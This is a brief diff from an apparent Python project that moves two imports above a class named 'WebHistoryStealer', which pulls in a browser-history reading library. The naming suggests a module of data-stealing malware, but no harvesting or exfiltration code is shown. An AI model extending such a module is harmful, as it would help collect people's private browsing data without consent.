@@ -2,8 +2,8 @@ import os
 
 from browser_history import get_history
 
-from config.constants import Constant
-from config.manager import ModuleManager
+from config import Constant
+from config import ModuleManager
 
 
 class WebHistoryStealer(ModuleManager):
